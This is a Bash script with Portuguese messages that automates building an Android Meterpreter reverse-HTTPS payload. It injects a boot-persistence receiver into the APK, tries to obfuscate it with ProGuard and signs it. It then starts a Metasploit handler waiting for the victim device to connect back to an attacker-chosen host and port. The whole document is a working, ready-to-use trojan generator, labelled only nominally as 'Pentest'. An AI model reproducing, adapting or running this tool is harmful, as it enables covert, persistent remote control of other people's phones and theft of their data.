#!/bin/bash

# Verifica se está rodando como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root para instalar dependências."
    echo "Por favor, execute: sudo $0"
    exit 1
fi

echo "=== Gerador Automático de Payload Android com Persistência e Ofuscação ==="

# Função para instalar dex2jar globalmente
install_dex2jar_global() {
    if ! command -v d2j-dex2jar.sh &> /dev/null; then
        echo "[*] dex2jar não encontrado. Instalando globalmente em /usr/local/dex2jar..."

        # Verifica se wget está instalado
        if ! command -v wget &> /dev/null; then
            echo "Erro: wget não está instalado. Instalando wget..."
            apt update && apt install -y wget
            if [ $? -ne 0 ]; then
                echo "Erro ao instalar wget. Abortando."
                exit 1
            fi
        fi

        # Verifica se unzip está instalado
        if ! command -v unzip &> /dev/null; then
            echo "Erro: unzip não está instalado. Instalando unzip..."
            apt update && apt install -y unzip
            if [ $? -ne 0 ]; then
                echo "Erro ao instalar unzip. Abortando."
                exit 1
            fi
        fi

        mkdir -p /usr/local/dex2jar

        # Obtém a URL da última release do dex2jar no GitHub (redirecionamento)
        LATEST_RELEASE_URL=$(wget --server-response --max-redirect=0 --quiet https://github.com/pxb1988/dex2jar/releases/latest 2>&1 | grep "Location:" | awk '{print $2}' | tr -d '\r\n')

        if [ -z "$LATEST_RELEASE_URL" ]; then
            echo "Erro ao obter a URL da última release do dex2jar. Abortando."
            exit 1
        fi

        # Extrai a tag da versão da URL (ex: v2.4)
        VERSION_TAG=$(basename "$LATEST_RELEASE_URL")
        if [[ ! "$VERSION_TAG" =~ ^v[0-9]+\.[0-9]+ ]]; then
            echo "Tag de versão inválida obtida: $VERSION_TAG. Abortando."
            exit 1
        fi

        # Remove o 'v' para formar o nome do arquivo
        VERSION_NUMBER="${VERSION_TAG#v}"

        # Monta a URL de download do zip
        DEX2JAR_ZIP_URL="https://github.com/pxb1988/dex2jar/releases/download/${VERSION_TAG}/dex2jar-${VERSION_NUMBER}.zip"

        echo "[*] Baixando dex2jar versão $VERSION_NUMBER de $DEX2JAR_ZIP_URL ..."
        wget -q -O /tmp/dex2jar.zip "$DEX2JAR_ZIP_URL"
        if [ $? -ne 0 ]; then
            echo "Erro ao baixar dex2jar. Abortando."
            exit 1
        fi

        unzip -q /tmp/dex2jar.zip -d /usr/local/dex2jar
        rm /tmp/dex2jar.zip
        echo "[*] dex2jar instalado em /usr/local/dex2jar/dex2jar-${VERSION_NUMBER}"

    else
        echo "[*] dex2jar já instalado."
        # Detecta versão instalada para PATH
        if [[ -d /usr/local/dex2jar ]]; then
            VERSION_DIR=$(ls /usr/local/dex2jar | grep dex2jar- | head -n1)
            if [ -n "$VERSION_DIR" ]; then
                VERSION_NUMBER="${VERSION_DIR#dex2jar-}"
            else
                VERSION_NUMBER="2.4" # fallback
            fi
        else
            VERSION_NUMBER="2.4" # fallback
        fi
    fi

    export PATH="/usr/local/dex2jar/dex2jar-${VERSION_NUMBER}:$PATH"
    echo "[*] PATH atualizado para incluir dex2jar."
}

# Função para instalar apktool
install_apktool() {
    if ! command -v apktool &> /dev/null; then
        echo "[*] apktool não encontrado. Instalando..."
        apt update && apt install -y apktool
        if [ $? -ne 0 ]; then
            echo "Erro ao instalar apktool. Abortando."
            exit 1
        fi
    else
        echo "[*] apktool encontrado."
    fi
}

# Função para instalar ProGuard
install_proguard() {
    if ! command -v proguard &> /dev/null; then
        echo "[*] ProGuard não encontrado. Instalando..."
        apt update && apt install -y proguard
        if [ $? -ne 0 ]; then
            echo "Erro ao instalar ProGuard. Abortando."
            exit 1
        fi
    else
        echo "[*] ProGuard encontrado."
    fi
}

# Função para verificar apksigner
check_apksigner() {
    if ! command -v apksigner &> /dev/null; then
        echo "[*] apksigner não encontrado. Instalando..."
        apt update && apt install -y apksigner
        if [ $? -ne 0 ]; then
            echo "Erro ao instalar apksigner. Abortando."
            exit 1
        fi
    else
        echo "[*] apksigner encontrado."
    fi
}

# Função para gerar keystore se não existir
generate_keystore() {
    if [ ! -f "$KEYSTORE" ]; then
        echo "[*] Keystore não encontrado. Gerando novo keystore..."
        keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 10000 -keystore "$KEYSTORE" -storepass changeit -keypass changeit -dname "CN=Payload,O=Pentest,C=BR"
        if [ $? -ne 0 ]; then
            echo "Erro ao gerar keystore."
            exit 1
        fi
        echo "[*] Keystore gerado com sucesso."
    else
        echo "[*] Keystore encontrado."
    fi
}

# Função para criar arquivo ProGuard
create_proguard_config() {
    cat > $PROGUARD_CONFIG <<EOF
-dontoptimize
-dontwarn **
-keep class com.metasploit.stage.** { *; }
-keep class $PACKAGE.** { *; }
EOF
}

# Solicita dados do usuário
DEFAULT_LHOST=$(hostname -I | awk '{print $1}')
read -p "Informe o LHOST (IP do servidor) [${DEFAULT_LHOST}]: " LHOST
LHOST=${LHOST:-$DEFAULT_LHOST}
while [[ -z "$LHOST" ]]; do
    echo "LHOST não pode ser vazio."
    read -p "Informe o LHOST (IP do servidor) [${DEFAULT_LHOST}]: " LHOST
    LHOST=${LHOST:-$DEFAULT_LHOST}
done

DEFAULT_LPORT=4444
read -p "Informe o LPORT (porta do servidor) [${DEFAULT_LPORT}]: " LPORT
LPORT=${LPORT:-$DEFAULT_LPORT}
while ! [[ "$LPORT" =~ ^[0-9]+$ ]]; do
    echo "LPORT deve ser um número válido."
    read -p "Informe o LPORT (porta do servidor) [${DEFAULT_LPORT}]: " LPORT
    LPORT=${LPORT:-$DEFAULT_LPORT}
done

read -p "Informe o nome do pacote Android (ex: com.payload.app): " PACKAGE
while [[ -z "$PACKAGE" ]]; do
    echo "Nome do pacote não pode ser vazio."
    read -p "Informe o nome do pacote Android (ex: com.payload.app): " PACKAGE
done

read -p "Informe o caminho para o keystore (ex: my-release-key.jks): " KEYSTORE
while [[ -z "$KEYSTORE" ]]; do
    echo "Caminho do keystore não pode ser vazio."
    read -p "Informe o caminho para o keystore (ex: my-release-key.jks): " KEYSTORE
done

read -p "Informe o alias da chave no keystore (ex: alias_name): " ALIAS
while [[ -z "$ALIAS" ]]; do
    echo "Alias não pode ser vazio."
    read -p "Informe o alias da chave no keystore (ex: alias_name): " ALIAS
done

PAYLOAD_NAME="app_payload.apk"
WORKDIR="app_payload_src"
OUTPUT_APK="app_payload_obf.apk"
PROGUARD_CONFIG="proguard.cfg"
MSF_RC="handler.rc"

# Instala dependências
install_apktool
install_proguard
check_apksigner
install_dex2jar_global

echo "[*] Gerando payload com msfvenom..."
msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT R > $PAYLOAD_NAME
if [ $? -ne 0 ]; then
    echo "Erro ao gerar payload com msfvenom."
    exit 1
fi

echo "[*] Descompilando APK com apktool..."
apktool d $PAYLOAD_NAME -o $WORKDIR -f
if [ $? -ne 0 ]; then
    echo "Erro ao descompilar APK."
    exit 1
fi

PACKAGE_SMALI=$(echo $PACKAGE | sed 's/\./\//g')
BOOTRECEIVER_PATH="$WORKDIR/smali/$PACKAGE_SMALI"

echo "[*] Criando diretório para BootReceiver: $BOOTRECEIVER_PATH"
mkdir -p $BOOTRECEIVER_PATH

echo "[*] Criando BootReceiver.smali..."
cat > $BOOTRECEIVER_PATH/BootReceiver.smali <<EOF
.class public L${PACKAGE_SMALI}/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    const-string v0, "android.intent.action.BOOT_COMPLETED"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0

    if-eqz v0, :cond_end

    const-class v1, Lcom/metasploit/stage/PayloadService;

    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_end
    return-void
.end method
EOF

echo "[*] Modificando AndroidManifest.xml para adicionar BootReceiver..."
sed -i '/<application/a\
    <receiver android:name=".'"$PACKAGE"'.BootReceiver" android:enabled="true" android:exported="true">\
        <intent-filter>\
            <action android:name="android.intent.action.BOOT_COMPLETED"/>\
        </intent-filter>\
    </receiver>' $WORKDIR/AndroidManifest.xml

echo "[*] Criando arquivo de configuração ProGuard..."
create_proguard_config

echo "[*] Recompilando APK..."
apktool b $WORKDIR -o $OUTPUT_APK
if [ $? -ne 0 ]; then
    echo "Erro ao recompilar APK."
    exit 1
fi

echo "[*] Iniciando ofuscação com ProGuard..."

mkdir -p temp_dex
unzip -o $OUTPUT_APK classes.dex -d temp_dex

DEX2JAR_BIN="/usr/local/dex2jar/dex2jar-${VERSION_NUMBER}/d2j-dex2jar.sh"
JAR2DEX_BIN="/usr/local/dex2jar/dex2jar-${VERSION_NUMBER}/d2j-jar2dex.sh"

if [ ! -x "$DEX2JAR_BIN" ] || [ ! -x "$JAR2DEX_BIN" ]; then
    echo "Erro: dex2jar scripts não encontrados ou não executáveis."
    rm -rf temp_dex
    exit 1
fi

"$DEX2JAR_BIN" temp_dex/classes.dex -o temp_dex/classes.jar
if [ $? -ne 0 ]; then
    echo "Erro ao converter dex para jar com dex2jar."
    rm -rf temp_dex
    exit 1
fi

proguard @${PROGUARD_CONFIG} -injars temp_dex/classes.jar -outjars temp_dex/classes_obf.jar

"$JAR2DEX_BIN" -o temp_dex/classes_obf.dex temp_dex/classes_obf.jar
if [ $? -ne 0 ]; then
    echo "Erro ao converter jar para dex com dex2jar."
    rm -rf temp_dex
    exit 1
fi

zip -j $OUTPUT_APK temp_dex/classes_obf.dex

rm -rf temp_dex

echo "[*] Assinando APK..."
generate_keystore

apksigner sign --ks $KEYSTORE --ks-key-alias $ALIAS --ks-pass pass:changeit --key-pass pass:changeit $OUTPUT_APK
if [ $? -ne 0 ]; then
    echo "Erro ao assinar APK."
    exit 1
fi

echo "[*] Payload pronto: $OUTPUT_APK"
echo "Instale e execute o APK no dispositivo alvo."

cat > $MSF_RC <<EOF
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

echo "[*] Iniciando handler do Metasploit automaticamente..."
msfconsole -r $MSF_RC
